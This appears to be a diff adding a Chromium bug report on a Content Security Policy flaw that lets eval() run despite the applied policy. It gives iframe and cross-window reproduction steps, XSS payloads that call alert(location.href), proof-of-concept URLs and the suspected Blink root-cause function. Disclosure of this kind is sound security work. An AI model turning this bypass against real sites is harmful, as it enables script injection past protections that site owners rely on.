@@ -1,0 +1,26 @@
+# Description
+There seems to be a flaw in checking whether eval() can be called according to the applied CSP.
+
+
+# Steps to reproduce:
+
+## Inside iframes
+CSP-parent: default-src 'none'; script-src 'unsafe-inline'; frame-src 'self'
+CSP-child: default-src 'unsafe-inline'
+HTML: <iframe src="?xss=<script>eval('alert(location.href)')</script">
+
+PoC 1: https://terjanq.me/xss.php?csp=default-src%20%27none%27;script-src%20%27unsafe-inline%27;frame-src%20%27self%27&html=%3Ciframe%20src=%22?csp=default-src%20%27unsafe-inline%27%26html=%3Cscript%3Eeval%28%27alert%28location.href%29%27%29%3C/script%3E%22%3E
+
+## Cross window navigations
+This also works, for cross-window clicks:
+CSP: default-src 'unsafe-inline'
+HTML: <script>eval('alert(location.href)')</script>
+
+PoC 2: https://terjanq.me/xss.php?csp=default-src%20%27unsafe-inline%27&html=%3Cscript%3Eeval%28%27alert%28location.href%29%27%29%3C/script%3E
+
+# Root cause
+A probable root cause discovered by antoniosartori@ in the email thread: https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/core/frame/csp/csp_directive_list.cc;l=677;drc=7af2c9199a0c30b6cc6d45a97065c55c00db0c14?originalUrl=https:%2F%2Fcs.chromium.org%2F
+
+bool CSPDirectiveList::ShouldCheckEval() const {
+  return script_src_ && !script_src_->AllowEval();
+}
